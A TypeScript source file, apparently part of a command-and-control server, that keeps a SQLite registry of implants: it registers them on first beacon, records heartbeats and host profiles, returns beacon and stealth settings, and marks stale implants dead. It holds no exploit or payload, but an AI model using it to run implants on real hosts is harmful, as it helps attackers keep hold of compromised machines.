import Database from "better-sqlite3";
import type { Implant, ImplantHeartbeat, ImplantRegistration, FleetSummary, ImplantConfig } from "../types.js";

export class FleetRegistry {
  private db: Database.Database;

  constructor(db: Database.Database) {
    this.db = db;
  }

  /** Register an implant on first beacon. */
  register(reg: ImplantRegistration): Implant {
    const now = new Date().toISOString();
    const envInterval = process.env.C2_DEFAULT_BEACON_INTERVAL ? parseInt(process.env.C2_DEFAULT_BEACON_INTERVAL, 10) : 0;
    const config: ImplantConfig = {
      beaconInterval: envInterval > 0 ? envInterval : 60_000,
      stealthConfig: null,
    };

    this.db.prepare(`
      INSERT INTO implants (id, name, target_host, status, first_seen, last_seen, version, beacon_interval)
      VALUES (@id, @name, @targetHost, 'active', @now, @now, @version, @beaconInterval)
    `).run({ ...reg, now, beaconInterval: config.beaconInterval });

    return this.get(reg.id)!;
  }

  /** Update heartbeat and return config for the implant. */
  heartbeat(implantId: string, hb: ImplantHeartbeat): ImplantConfig | null {
    const exists = this.db.prepare(`SELECT id FROM implants WHERE id = ?`).get(implantId);
    if (!exists) return null;

    const now = new Date().toISOString();
    this.db.prepare(`
      UPDATE implants SET last_seen = ?, status = ?,
        profile = COALESCE(?, profile)
      WHERE id = ?
    `).run(now, hb.status, hb.profile ? JSON.stringify(hb.profile) : null, implantId);

    // Return current config
    const row = this.db.prepare(`
      SELECT beacon_interval, stealth_config FROM implants WHERE id = ?
    `).get(implantId) as { beacon_interval: number; stealth_config: string | null } | undefined;

    if (!row) return null;
    return {
      beaconInterval: row.beacon_interval,
      stealthConfig: row.stealth_config ? JSON.parse(row.stealth_config) : null,
    };
  }

  /** Get an implant by ID. */
  get(id: string): Implant | null {
    const row = this.db.prepare(`SELECT * FROM implants WHERE id = ?`).get(id) as Record<string, unknown> | undefined;
    if (!row) return null;
    return this.rowToImplant(row);
  }

  /** List all implants. */
  list(): Implant[] {
    const rows = this.db.prepare(`SELECT * FROM implants ORDER BY last_seen DESC`).all() as Record<string, unknown>[];
    return rows.map((r) => this.rowToImplant(r));
  }

  /** Get fleet summary counts. */
  summary(): FleetSummary {
    const rows = this.db.prepare(`
      SELECT status, COUNT(*) as count FROM implants GROUP BY status
    `).all() as { status: string; count: number }[];

    const byStatus: Record<string, number> = {};
    for (const r of rows) byStatus[r.status] = r.count;

    return {
      total: rows.reduce((s, r) => s + r.count, 0),
      active: byStatus["active"] ?? 0,
      dead: byStatus["dead"] ?? 0,
      implants: this.list(),
    };
  }

  /** Mark implant as destroyed. */
  markDestroyed(implantId: string): void {
    this.db.prepare(`UPDATE implants SET status = 'destroyed' WHERE id = ?`).run(implantId);
  }

  /** Mark stale implants as dead. */
  pruneStale(maxAgeMs: number): string[] {
    const cutoff = new Date(Date.now() - maxAgeMs).toISOString();
    const result = this.db.prepare(`
      UPDATE implants SET status = 'dead' WHERE status = 'active' AND last_seen < ?
    `).run(cutoff);
    // Return pruned IDs (would need another query — skipping for now)
    return [];
  }

  private rowToImplant(row: Record<string, unknown>): Implant {
    return {
      id: row.id as string,
      name: row.name as string,
      targetHost: (row.target_host as string) ?? "",
      status: row.status as Implant["status"],
      firstSeen: row.first_seen as string,
      lastSeen: row.last_seen as string,
      version: (row.version as string) ?? "",
      profile: row.profile ? JSON.parse(row.profile as string) : null,
      tags: row.tags ? JSON.parse(row.tags as string) : [],
      config: {
        beaconInterval: (row.beacon_interval as number) ?? 60000,
        stealthConfig: row.stealth_config ? JSON.parse(row.stealth_config as string) : null,
      },
    };
  }
}
